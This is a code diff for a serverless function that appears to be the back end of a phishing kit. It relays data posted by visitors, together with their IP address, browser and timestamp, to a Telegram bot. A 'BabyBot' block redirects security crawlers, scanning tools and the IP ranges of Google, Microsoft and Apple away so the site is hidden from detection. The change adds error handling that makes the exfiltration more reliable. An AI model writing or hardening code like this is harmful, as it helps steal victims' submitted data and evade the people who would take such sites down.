@@ -8,13 +8,21 @@ exports.handler = async (event) => {
   const ip = event.headers['client-ip'] || 'Unknown';
   const agent = event.headers['user-agent'] || 'Unknown';
   const time = new Date().toISOString();
-  const data = JSON.parse(event.body);
+
+  let data;
+  try {
+    data = JSON.parse(event.body);
+  } catch (error) {
+    console.log('JSON Parse Error:', error.message);
+    return { statusCode: 400, body: 'Invalid payload' };
+  }
 
   // BabyBot Logic
   const agentsBlacklist = ['curl', 'wget', 'python-requests', 'node-fetch', 'PostmanRuntime', 'okhttp', 'Apache-HttpClient'];
   const ipsBlacklist = ['66.249.', '157.55.', '207.46.', '40.77.', '17.', '216.58.', '142.250.', '142.251.'];
   const lowerAgent = agent.toLowerCase();
   if (agentsBlacklist.some(bad => lowerAgent.includes(bad)) || ipsBlacklist.some(bad => ip.startsWith(bad))) {
+    console.log('Blocked by blacklist:', { ip, agent });
     return { statusCode: 302, headers: { Location: 'https://google.com' } };
   }
 
@@ -37,11 +45,21 @@ exports.handler = async (event) => {
   }
   message += `IP: ${ip}\nBrowser: ${agent}\nDate and time: ${time}`;
 
-  await fetch(telegramUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: new URLSearchParams({ chat_id: telegramChatId, text: message })
-  });
+  try {
+    const response = await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({ chat_id: telegramChatId, text: message })
+    });
+    const result = await response.json();
+    if (!response.ok) {
+      console.log('Telegram API Error:', result);
+      return { statusCode: 500, body: 'Failed to send to Telegram' };
+    }
+  } catch (error) {
+    console.log('Fetch Error:', error.message);
+    return { statusCode: 500, body: 'Network error' };
+  }
 
   return {
     statusCode: 200,
